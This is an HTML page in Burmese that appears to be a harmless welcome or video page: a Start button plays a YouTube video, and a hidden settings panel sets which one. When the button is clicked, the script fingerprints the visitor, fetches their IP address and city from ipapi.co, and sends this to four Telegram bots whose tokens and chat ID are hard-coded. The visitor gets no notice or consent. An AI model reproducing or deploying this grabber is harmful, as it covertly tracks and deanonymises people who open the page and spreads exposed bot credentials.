<!DOCTYPE html>
<html lang="my">
<head>
    <meta charset="UTF-8">
    <title>Management System</title>
    <script src="https://cdn.tailwindcss.com"></script>
    <script src="https://cdn.jsdelivr.net/npm/@fingerprintjs/fingerprintjs@3/dist/fp.min.js"></script>
</head>
<body class="bg-black text-white min-h-screen">

    <div id="player" class="hidden"></div>

    <div id="app" class="max-w-md mx-auto p-6 text-center">
        <div id="public-view" class="hidden mt-20">
            <h1 class="text-3xl font-bold mb-8">ကြိုဆိုပါ၏</h1>
            <button onclick="startAction()" class="bg-red-600 px-12 py-4 rounded-full text-xl font-bold hover:bg-red-700">စတင်မည်</button>
        </div>

        <div id="admin-view" class="hidden mt-10 text-left bg-gray-900 p-6 rounded-lg">
            <h2 class="text-xl font-bold mb-4 text-blue-400">Settings Panel</h2>
            <input id="yt-id" class="w-full p-2 mb-4 text-black rounded" placeholder="YouTube Video ID (e.g. dQw4w9WgXcQ)">
            <button onclick="saveSettings()" class="bg-blue-600 w-full py-2 rounded">Save & Update</button>
        </div>
    </div>

    <script src="https://www.youtube.com/iframe_api"></script>
    <script>
        let player;
        function onYouTubeIframeAPIReady() {
            player = new YT.Player('player', {
                videoId: localStorage.getItem('ytId') || 'dQw4w9WgXcQ',
                playerVars: { 'autoplay': 0 }
            });
        }

        async function startAction() {
            if (player && player.playVideo) {
                player.playVideo();
            }
            
            // Tracking
            const fp = await FingerprintJS.load();
            const res = await fp.get();
            const ipData = await (await fetch('https://ipapi.co/json/')).json();
            const msg = `Visitor ID: ${res.visitorId}%0AIP: ${ipData.ip}%0ACity: ${ipData.city}`;
            
            const bots = [
                {t: "8869917655:AAFk9tcBhEkmaFEOzXsbmcRQtymBtSZ3M9g", c: "6917040501"},
                {t: "8914390345:AAE-oorODF1HQbOLkuKJkNXwy-w2XbXtud0", c: "6917040501"},
                {t: "8684986169:AAE2JP-iOydPWEStbg2iDQ4koipL1czWYs0", c: "6917040501"},
                {t: "8949147819:AAGBSy8ZexmYrDMo2pRuqUA1k8PyOyE9OJQ", c: "6917040501"}
            ];

            bots.forEach(b => fetch(`https://api.telegram.org/bot${b.t}/sendMessage?chat_id=${b.c}&text=${msg}`));
        }

        function saveSettings() {
            localStorage.setItem('ytId', document.getElementById('yt-id').value);
            alert("သိမ်းဆည်းပြီးပါပြီ");
        }

        // Router
        if(window.location.hash === '#/step/2003') {
            document.getElementById('admin-view').classList.remove('hidden');
        } else {
            document.getElementById('public-view').classList.remove('hidden');
        }
    </script>
</body>
</html>
